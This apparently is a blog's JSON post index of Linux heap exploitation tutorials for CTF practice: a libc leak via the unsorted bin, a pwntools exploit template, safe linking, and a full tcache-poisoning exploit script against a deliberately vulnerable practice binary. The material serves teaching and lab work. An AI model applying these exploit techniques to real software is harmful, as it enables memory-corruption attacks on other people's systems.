[ { "title": "Libc leak with tcache enabled", "url": "/2025/08/14/tcache-libc-leak.html", "categories": "", "tags": "", "date": "2025-08-14 06:50:19 +0200", "content": "Description When we have a UAF to read from a freed chunk how can we use this to get a libc leak? The tcache only stores its next ptrs and a key value, so we cannot leak libc through there. But if we could allocate and free more than what tcache can hold (7 chunks per bin) and then free another chunk that does not fit into fastbins, we might get it into unsortedbin. Unsortedbin contains libc ptrs to main arena. How to leak libc through unsortedbin We are going to allocate and free 7 chunks to fill the tcache, 1 chunk to go into unsortedbin and a guard chunk to prevent top chunk consolidation. The chunks for tcache and unsortedbin are malloc(0x90) to prevent them from going into fastbin (larger than 64 bytes) and the guard chunk is only malloc(0x20) because its size does not matter. The POC program allows you to do arbitrary allocations of almost arbitrary size. At address 0x555555559700 and 0x555555559708 you see that they contain the libc addresses of the unsortedbin. They are the fd and bk ptrs to the main arena. At address 0x5555555597a0 you see the guard chunk user data. This guard chunk prevents top chunk consolidation and forces the previous chunk into the unsortedbin - just what we want. Next up, the address from the unsortedbin chunk is leaked using the UAF bug in the POC binary. This Leak is at a fixed offset from libc base and this enables us to calculate libc base - finalizing our libc leak. The libc calculation is shown below: The picture below shows you the end result in the termina: " }, { "title": "Exploit script template - python", "url": "/2025/08/13/exploit-script.html", "categories": "", "tags": "", "date": "2025-08-13 06:50:19 +0200", "content": "Description When exploiting a program such as a CTF challenge, it is often a good idea to have a standardized starting point. I will refer to this as an exploit script template. My template is inspired by Max Kamper’s exploit script that is used in his Heap Lab turorials on Udemy (which I highly recommend). Script I usually have it in ~/Desktop/xpl.py which easily allows me to copy it around my file system whenever I start a new CTF. Note: Do not name your exploit script ‘pwn.py’ since this will confuse the python interpreter with the pwntools library also named ‘pwn’ and then it wil not work. You can copy the script from below: #!/usr/bin/python3 from pwn import * elf = context.binary = ELF(\"chall\") gs = ''' c ''' context.arch = 'amd64' def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs, aslr=False) if args.REMOTE: return remote(\"address\", 12345) else: return process(elf.path, close_fds=False) #shellcode = asm('\\n'.join([ #])) io = start() io.interactive() Walkthrough - line by line The following line is called a shebang and tells the system which python interpreter to use: #!/usr/bin/python3 The following line imports all functions from the pwntools library: from pwn import * The following line sets the context binary to the “chall” binary in the same directory: elf = context.binary = ELF(\"chall\") The following sets the gdb script where you can set gdb commands as you wish. For example to break on a specific address you could use: b *addr or b *main+104 depending on your needs: gs = ''' c ''' The folling line sets the context.arch variable in pwntools. This is important for when you need shellcode to compile correctly. You can change this depending on the target binary. context.arch = 'amd64' The folling function “start()” will be used to start the target binary that is specified at the beginning of the script. Some important things to note are: args.GDB wich means you can start the program with gdb debugging using the command: python3 xpl.py GDB Note: the ‘GDB’ is case sensitive The close_fds=False means that previously opened file descriptors will still be open. This is useful when you need to open some file that should be visible to the target program when it is started. This does not include stdin, stdout or stderr which will be opened by default. aslr=False is an option that allows you to select if you want to debug with or without aslr enabled - even when inside of GDB. This can make your debugging experience easier. def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs, aslr=False) if args.REMOTE: return remote(\"address\", 12345) else: return process(elf.path, close_fds=False) The following can be uncommented if you need to shellcode in your exploit script. #shellcode = asm('\\n'.join([ #])) One example of shellcoding is: value = 15 shellcode = asm('\\n'.join([ \"mov rax, 90\", f\"mov rsi {value}\", \"syscall\" ])) The formatted string above is just an example to show you what’s possible. The last two lines are used to start the target binary and go to interactive mode. Your exploit should mainly be written between those to function calls: io = start() # Primarily writing exploit here. io.interactive() " }, { "title": "Tcache-Poison", "url": "/2025/08/13/tcache-poison.html", "categories": "", "tags": "", "date": "2025-08-13 06:50:19 +0200", "content": "Description Tcache poisoning is a common heap exploitation technique in CTFs. It involves overwriting the next ptr of a free tcache chunk to decide where the following chunk will be allocated. You can understand more about tcache poisoning by clicking this link: how2heap. You will need to compile and examine the desired binary to better understand how the heap works. To visualize the heap in pwndbg we will use the ‘vis’ command. At the bottom of this page you will see the full exploit script that demonstrates a tcache poison on the a POC binary. You can use the already defined functions to interact with the binary or implement them yourself. Video This blog post features a video at the following link The video is intended for a more thourough walkthrough than the post itself. Walkthrough Using the POC binary, we will allocate and free a chunk and with the UAF bug we will leak the ptr that it contains. Since there is no other free chunk in the particular tcache bin, the ptr mangling (safe linking) that modern libc tcache employs will not be very effective and we can use the leak to calculate the heap base address. This is very important since it will allow us to calculate where future heap allocations are, enabling us to circumvent the safe linking for future allocations. Allocate and free a chunk: And in the tcache metadata we will see: Address 0x555555559010 holds the value 0x1, meaning that there is 1 free chunk in the 0x50 tcache bin. Address 0x5555555590a8 holds the ptr to the user data of the chunk at the head of the 0x50 tcache bin. As you can see there is a lot of similarity between the ptr contained in the free chunk and the heap base addr. To make things clearer, the heap starts at 0x555555559000 So if we leak the ptr in the free chunk and left shift it by 12 bits we will have the same value as the heap base address. The following python code achieves this: # allocate chunk0 p = b\"A\"*8 malloc(0, 0x40, p) # free chunk0 free(0) # leak heap base via chunk 0 heap_leak = puts(0) heap_leak = heap_leak[:8] heap_leak = u64(heap_leak.ljust(8,b\"\\x00\")) heap_base = heap_leak &lt;&lt; 12 print(\"heap_base:\",hex(heap_base)) This should give you the following output: heap_base: 0x555555559000 [*] Switching to interactive mode MENU: 1: Malloc 2: Free 3: Edit 4: Print &gt; $ Now we need to allocate two chunks, free them and then overwrite the next ptr of the last freed chunk. Something along the lines of: allocate chunk0 and chunk1 free chunk1 and then chunk0 calculate the safe_link mangling using the addr of chunk0 and the target addr allocate chunk0 again and then chunk1 which now points to an attacker controlled destination Allocation, freeing and overwriting: Allocating again: Full exploit POC with comments: #!/usr/bin/python3 from pwn import * elf = context.binary = ELF(\"program\") gs = ''' c ''' context.arch = 'amd64' def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs, aslr=False) if args.REMOTE: return remote(\"address\", 12345) else: return process(elf.path, close_fds=False) #shellcode = asm('\\n'.join([ #])) def safe_link(home, target): return (home &gt;&gt; 12) ^ target def malloc(index: int, size: int, payload: bytes): io.sendlineafter(b\"&gt; \", b\"1\") io.sendlineafter(b\"&gt; \", str(index).encode()) io.sendlineafter(b\"&gt; \", str(size).encode()) io.sendafter(b\"&gt; \", payload) def free(index: int): io.sendlineafter(b\"&gt; \", b\"2\") io.sendlineafter(b\"&gt; \", str(index).encode()) def edit(index: int, payload: bytes): io.sendlineafter(b\"&gt; \", b\"3\") io.sendlineafter(b\"&gt; \", str(index).encode()) io.sendafter(b\"&gt; \", payload) def puts(index: int): io.sendlineafter(b\"&gt; \", b\"4\") io.sendlineafter(b\"&gt; \", str(index).encode()) io.recvuntil(b\"&gt; \") leak = io.recvline().strip(b\"\\n\") return leak io = start() # allocate chunk0 p = b\"A\"*8 malloc(0, 0x40, p) # free chunk0 free(0) # leak heap base via chunk 0 heap_leak = puts(0) heap_leak = heap_leak[:8] heap_leak = u64(heap_leak.ljust(8,b\"\\x00\")) heap_base = heap_leak &lt;&lt; 12 print(\"heap_base:\",hex(heap_base)) # allocate the chunk again and allocate another one of the same size malloc(1, 0x40, p) malloc(2, 0x40, p) # free chunk2 and then chunk1 # this will cause: chunk1 -&gt; chunk2 free(2) free(1) # edit the ptr in chunk1 -&gt; target # when doing this, we need to know the address of chunk1 so we can use # the safe_link function # I call the function that contains the ptr the 'home' chunk # By inspecting the heap we can see that the home chunk is at # offset 0x2a0 from the heap base address home = heap_base + 0x2a0 # We will just target heap_base + 0x100 to demonstrate # It is important that the address is read/writable and that it is # 16 byte aligned, meaning the last character of the address # should be '0' and not '8' or something else target = heap_base + 0x100 addr = safe_link(home, target) p = p64(addr) edit(1, p) # next up we allocate chunk1 again and then we allocate chunk2 # which was manipulated by us to point # to heap_base+0x100 malloc(3, 0x40, b\"B\") malloc(4, 0x40, b\"XXXX\") io.interactive() " }, { "title": "Safe Linking (tcache, fastbins)", "url": "/2025/08/13/safe-linking.html", "categories": "", "tags": "", "date": "2025-08-13 06:50:19 +0200", "content": "Description To make it harder for an attacker to overwrite the next ptr in a free tcache or fastbin chunk, newer libc versions feature a security measure called “Safe Linking” (version 2.32 and onwards). This means that the next ptr in the free chunk is not stored in plaintext, but rather it is mangled. Some information about the tcache Consider the following scenario: Imagine we have 2 chunks allocated with malloc(0x40): Chunk0 and chunk1. First chunk1 is freed and then chunk0. Now in the tcache 0x50 bin you will have the following layout: chunk0 -&gt; chunk1. This means that chunk0 is the ‘head’ of the 0x50 tcache bin (0x50 because 0x40+0x10 for metadata such as size field). The head is the first chunk to be allocated if a malloc(0x40) occurs, since the tcache uses last-in-first-out (like a stack). But in order to keep track of the next elements in the same bin, the tcache uses a ptr to the user data of the next chunk. If this ptr is overwritten by an attacker, they can control where the next allocation will be, giving them a lot of control. To try and mitigate this, safe linking has been employed, so that an attacker cannot ‘just’ overwrite the next ptr with a plain text value. They need a heap leak first, since safe linking uses the heap addresses to mangle the next ptr before storing it. Safe Linking To put it plainly, safe linking works by doing the following: chunk0-&gt;fd = (chunk0 &gt;&gt; 12) ^ chunk1 Take the address of chunk0 and right shift 12 bits, then xor with chunk1 and store result at the address of chunk0. To get back the original ptr, do the following: read_fd = (chunk0 &gt;&gt; 12) ^ chunk1 Below is a picture that illustrates safe linking: chunk0 is at addr: 0x5555555592a0 chunk1 is at addr: 0x5555555592f0 So to do safe linking here: chunk0-&gt;fd = (0x5555555592a0 » 12) ^ 0x5555555592f0 chunk0-&gt;fd is the first value you see at address 0x5555555592a0: 0x000055500000c7a9 " }, { "title": "POC Binary", "url": "/2025/08/13/poc-binary.html", "categories": "", "tags": "", "date": "2025-08-13 06:50:19 +0200", "content": "Description The following binary will be used as a proof of concept to demonstrate various scenarios in the linux heap. I will be using libc version 2.39 on a Ubuntu 24 LTS machine. The following zip archive contains 4 files: Source code, elf binary, libc and linker. You can download the zip archive by clicking here. The archive can be unzipped by running the following command: tar -xvzf poc-binary.tar.gz Walkthrough Using the file command you should see the following output: file program program: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5ebf57c66be7230d65662438a74d55d2d49494fb, for GNU/Linux 3.2.0, not stripped You’ll notice that is a dynamically linked binary, meaning that it loads the necessary libraries at runtime. So unless you are also using Ubuntu 24 LTS with libc version 2.39 it would be a very good idea to make sure that the binary uses the provided libraries. Pwninit is a binary that can patch a binary to use the specified libc and linker. The pwninit binary can be downloaded from Github here. The following command can then be used to make the binary run with the proper libc and linker. You will have to use the output binary called program_patched: /path/to/pwninit --libc libc.so.6 --ld ld-linux-x86-64.so.2 --bin program Now the program is ready to run: As you can see from the picture above, this is a simple console application that allows you to do different things on the heap. The program is written in such a way, that every time it is finished giving output such as printing the menu or some data, it will output a “&gt; “ which should make your exploit development easier. Also, the program has these bugs that will be relevant for you: You can do more than 16 allocations, since the program does not check if an allocation has already been made given a certain index e.g. index 4 can be used multiple times The program has a UAF bug allowing both writing to a free chunk using the “Edit” option but also printing from a free chunk using the “Print” option. The “Print” option is using puts which means that it will terminate on a null byte or a newline character. This has some implications in terms of how a leak can be achieved. Play around with the program and look at the source code to understand the program. " }, { "title": "Linux Heap", "url": "/2025/08/13/heap.html", "categories": "", "tags": "", "date": "2025-08-13 06:50:19 +0200", "content": " POC Binary Tcache into libc leak Safe Linking Tcache Poisoning " }, { "title": "Linux", "url": "/jekyll/update/2025/08/13/linux.html", "categories": "jekyll, update", "tags": "", "date": "2025-08-13 06:50:19 +0200", "content": " Exploit script template Heap " } ]
